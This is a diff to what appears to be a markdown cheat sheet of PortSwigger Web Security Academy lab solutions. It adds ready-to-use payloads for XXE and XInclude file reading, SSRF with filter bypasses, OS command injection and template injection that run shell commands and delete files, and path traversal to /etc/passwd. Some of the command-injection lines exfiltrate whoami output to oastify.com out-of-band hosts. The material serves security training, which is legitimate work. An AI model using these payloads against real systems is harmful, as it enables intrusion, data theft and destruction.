@@ -418,7 +418,109 @@ location='https://exploit-0a6c004404690be78097022101e1007c.exploit-server.net/lo
 <?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "https://exploit-0a44001203aa653186412e3e016d0074.exploit-server.net/error.dtd"> %xxe;]>
 <stockCheck><productId>1</productId><storeId>1</storeId></stockCheck>
+<!-- Exploiting XInclude to retrieve files -->
+<foo xmlns:xi="http://www.w3.org/2001/XInclude">
+<xi:include parse="text" href="file:///etc/passwd"/></foo>
+<!-- Exploiting XXE via image file upload -->
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE example [ <!ENTITY xxe SYSTEM "file:///etc/hostname" > ]>
+<svg xmlns="http://www.w3.org/2000/svg" height="100" width="100">
+  <circle cx="50" cy="50" r="40" stroke="black" stroke-width="3" fill="red" />
+  <text x="50" y="50" text-anchor="middle">&xxe;</text>
+</svg>
 ```
 {% endraw %}
 - malicious.dtd can be found [here](/assets/solutions/portswigger/malicious.dtd).
 - error.dtd can be found [here](/assets/solutions/portswigger/error.dtd).
+
+## Server-side request forgery (SSRF)
+### Notes
+### Labs
+```sh
+# Basic SSRF against the local server
+http://localhost/admin/delete?username=carlos
+# Basic SSRF against another back-end system
+http://192.168.0.225:8080/admin/delete?username=carlos
+# Blind SSRF with out-of-band detection
+- test it in the referer header
+# SSRF with blacklist-based input filter
+http%3a%2f%2f127.1%2f%25%36%31dmin/delete?username=carlos
+# SSRF with filter bypass via open redirection vulnerability
+/product/nextProduct?path=http://192.168.0.12:8080/admin/delete?username=carlos
+```
+
+## OS command injection
+### Notes
+### Labs
+```sh
+# OS command injection, simple case
+productId=1&storeId=1;whoami
+# Blind OS command injection with time delays
+;ping -c 10 127.0.0.1;
+# Blind OS command injection with output redirection
+;whoami > /var/www/images/whoami.txt;
+# Blind OS command injection with out-of-band interaction
+;curl https://av9lnin7zi6tjshiejryenukjbp2ds1h.oastify.com;
+# Blind OS command injection with out-of-band data exfiltration
+;nslookup https://`whoami`.ophzhwhltw07d6bw8xlc81oydpjg77vw.oastify.com;
+```
+
+## Server-side template injection
+### Note
+- Use this to identify template engin: `${{<%[%'"}}%\`
+- ERB: `<%= 7*7 %>`
+- Tornado: `{{ 7*7 }}`
+
+### Labs
+```java
+// Basic server-side template injection (ERB)
+<%= system("rm morale.txt") %>
+// Basic server-side template injection (code context)
+user.name}}{{__import__("os").popen("rm morale.txt").read()}}
+// Server-side template injection using documentation (Freemaker JAVA)
+<#assign ex="freemarker.template.utility.Execute"?new()>
+${ ex("rm morale.txt") }
+// Server-side template injection in an unknown language with a documented exploit (Handlebars)
+{{#with "s" as |string|}}
+  {{#with "e"}}
+    {{#with split as |conslist|}}
+      {{this.pop}}
+      {{this.push (lookup string.sub "constructor")}}
+      {{this.pop}}
+      {{#with string.split as |codelist|}}
+        {{this.pop}}
+        {{this.push "return require('child_process').execSync('rm morale.txt');"}}
+        {{this.pop}}
+        {{#each conslist}}
+          {{#with (string.sub.apply 0 codelist)}}
+            {{this}}
+          {{/with}}
+        {{/each}}
+      {{/with}}
+    {{/with}}
+  {{/with}}
+{{/with}}
+// Server-side template injection with information disclosure via user-supplied objects (django)
+{{settings.SECRET_KEY}}
+```
+
+## Path traversal
+### Notes
+- `../` double url encode: `%252e%252e%252f`
+### Labs
+```sh
+# File path traversal, simple case
+../../../../etc/passwd
+# File path traversal, traversal sequences blocked with absolute path bypass
+/etc/passwd
+# File path traversal, traversal sequences stripped non-recursively
+....//....//....//....//etc/passwd
+# File path traversal, traversal sequences stripped with superfluous URL-decode
+%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252fetc/passwd
+# File path traversal, validation of start of path
+/var/www/images/../../../../etc/passwd
+# File path traversal, validation of file extension with null byte bypass
+../../../../etc/passwd%00.jpg
+```
+
+
